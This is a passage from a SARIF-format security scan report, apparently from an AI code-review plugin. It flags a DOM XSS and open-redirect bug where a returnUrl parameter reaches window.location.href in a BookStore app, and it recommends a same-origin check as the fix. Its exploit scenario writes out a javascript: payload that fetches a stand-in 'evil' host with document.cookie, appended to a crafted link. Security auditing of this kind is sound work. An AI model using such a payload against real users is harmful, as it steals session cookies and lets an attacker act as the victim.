                  "true": 3,
                  "false": 0,
                  "voters": 3
                }
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "DOM XSS / open redirect: returnUrl query parameter assigned to window.location.href without scheme check.\n\nThe returnUrl query parameter is controlled by whoever crafts the link. After a successful save it is assigned to window.location.href, and nothing restricts it to http(s) or a same-site path, so a javascript: URL runs in the app origin and an absolute URL redirects off-site.\n\nImpact: Script execution in the SPA origin (cookie theft, actions taken as the victim) or an open redirect to an attacker site.\n\nExploit scenario: The attacker sends the victim a link such as https://bookstore/update-rating/1?returnUrl=javascript:fetch('//evil/'+document.cookie). The victim picks a star and submits. The save succeeds, goToRatingsList assigns the javascript: URL to location, and the script runs in the BookStore web origin. With returnUrl=https://evil.example the same code redirects the victim to a phishing page.\n\nPreconditions: Victim opens an attacker-crafted update-rating link; Victim submits the form and the save succeeds.\n\nRecommendation: Accept only same-app relative paths: require a leading '/' that is not followed by '/' or '\\', and navigate with router.navigateByUrl. Otherwise parse with new URL(returnUrl, location.origin) and require url.origin === location.origin and an http(s) protocol before navigating.\n\nCWE-79. Severity MEDIUM, confidence high."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "web/src/app/ratings/update-rating/update-rating.component.ts",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 71,
                  "snippet": {
                    "text": "      window.location.href = returnUrl;"
                  }
                }
              },
              "logicalLocations": [
                {
                  "name": "UpdateRatingComponent.goToRatingsList",
                  "fullyQualifiedName": "UpdateRatingComponent.goToRatingsList"
                }
              ]
            }
          ],
          "properties": {
            "claudeSecurityPlugin": {
              "id": "F2",
              "title": "DOM XSS / open redirect: returnUrl query parameter assigned to window.location.href without scheme check",
              "impact": "Script execution in the SPA origin (cookie theft, actions taken as the victim) or an open redirect to an attacker site.",
              "file": "web/src/app/ratings/update-rating/update-rating.component.ts",
              "line": 71,
              "description": "The returnUrl query parameter is controlled by whoever crafts the link. After a successful save it is assigned to window.location.href, and nothing restricts it to http(s) or a same-site path, so a javascript: URL runs in the app origin and an absolute URL redirects off-site.",
              "exploit_scenario": "The attacker sends the victim a link such as https://bookstore/update-rating/1?returnUrl=javascript:fetch('//evil/'+document.cookie). The victim picks a star and submits. The save succeeds, goToRatingsList assigns the javascript: URL to location, and the script runs in the BookStore web origin. With returnUrl=https://evil.example the same code redirects the victim to a phishing page.",
              "preconditions": [
                "Victim opens an attacker-crafted update-rating link",
                "Victim submits the form and the save succeeds"
              ],
              "category": "Cross-site Scripting",
              "severity": "MEDIUM",
              "confidence": "high",
              "recommendation": "Accept only same-app relative paths: require a leading '/' that is not followed by '/' or '\\', and navigate with router.navigateByUrl. Otherwise parse with new URL(returnUrl, location.origin) and require url.origin === location.origin and an http(s) protocol before navigating.",
              "cwe_id": "CWE-79",
              "snippet": "      window.location.href = returnUrl;",
              "symbol": "UpdateRatingComponent.goToRatingsList",
              "declared_line": 71,
              "via_change": "web/src/app/ratings/update-rating/update-rating.component.ts:69-72 adds code that reads returnUrl from the route's query parameters and, when it is present, assigns it straight to window.location.href in place of the router navigation to /ratings.",
              "other_cwe_ids": [],
